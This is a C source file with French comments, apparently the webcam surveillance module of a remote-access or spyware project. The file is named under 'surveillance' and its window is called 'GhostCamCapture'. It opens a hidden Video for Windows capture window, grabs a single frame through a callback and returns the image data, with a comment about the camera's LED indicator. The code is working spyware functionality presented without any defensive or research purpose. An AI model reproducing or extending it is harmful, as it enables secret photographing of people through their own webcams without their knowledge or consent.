/*
 * webcam.c - Implémentation de la capture webcam via VFW
 * 
 * Utilise Video for Windows (VFW) pour capturer une image.
 * Note: Le voyant LED est généralement contrôlé par le hardware.
 */

#include "../../include/surveillance/webcam.h"
#include <vfw.h>

/* Lien avec la bibliothèque VFW */
#pragma comment(lib, "vfw32.lib")

/* Constantes */
#define WEBCAM_WINDOW_NAME   "GhostCamCapture"
#define CAPTURE_TIMEOUT_MS   3000
#define DRIVER_INDEX         0

/* Variables globales pour la callback */
static BYTE* g_pFrameData = NULL;
static DWORD g_dwFrameSize = 0;
static bool g_bFrameCaptured = false;

/*
 * Callback appelée quand une frame est capturée
 */
static LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVHdr) {
    UNUSED(hWnd);
    
    if (lpVHdr && lpVHdr->lpData && lpVHdr->dwBytesUsed > 0) {
        /* Copie les données de la frame */
        g_pFrameData = (BYTE*)malloc(lpVHdr->dwBytesUsed);
        if (g_pFrameData) {
            memcpy(g_pFrameData, lpVHdr->lpData, lpVHdr->dwBytesUsed);
            g_dwFrameSize = lpVHdr->dwBytesUsed;
            g_bFrameCaptured = true;
        }
    }
    return TRUE;
}

bool Webcam_CaptureSnapshot(BYTE** data, DWORD* size) {
    HWND hWndCapture = NULL;
    bool success = false;
    DWORD startTime;
    
    /* Initialise les variables globales */
    g_pFrameData = NULL;
    g_dwFrameSize = 0;
    g_bFrameCaptured = false;
    
    /* Crée une fenêtre de capture invisible */
    hWndCapture = capCreateCaptureWindow(
        WEBCAM_WINDOW_NAME,
        WS_POPUP,           /* Fenêtre invisible */
        0, 0, 320, 240,
        NULL,
        0
    );
    
    if (!hWndCapture) {
        return false;
    }
    
    /* Connecte au driver webcam */
    if (!capDriverConnect(hWndCapture, DRIVER_INDEX)) {
        DestroyWindow(hWndCapture);
        return false;
    }
    
    /* Configure la callback pour recevoir les frames */
    capSetCallbackOnFrame(hWndCapture, FrameCallback);
    
    /* Demande une capture */
    capGrabFrameNoStop(hWndCapture);
    
    /* Attend la capture avec timeout */
    startTime = GetTickCount();
    while (!g_bFrameCaptured && (GetTickCount() - startTime) < CAPTURE_TIMEOUT_MS) {
        MSG msg;
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);
    }
    
    /* Vérifie si la capture a réussi */
    if (g_bFrameCaptured && g_pFrameData && g_dwFrameSize > 0) {
        *data = g_pFrameData;
        *size = g_dwFrameSize;
        success = true;
    }
    
    /* Nettoyage */
    capSetCallbackOnFrame(hWndCapture, NULL);
    capDriverDisconnect(hWndCapture);
    DestroyWindow(hWndCapture);
    
    return success;
}
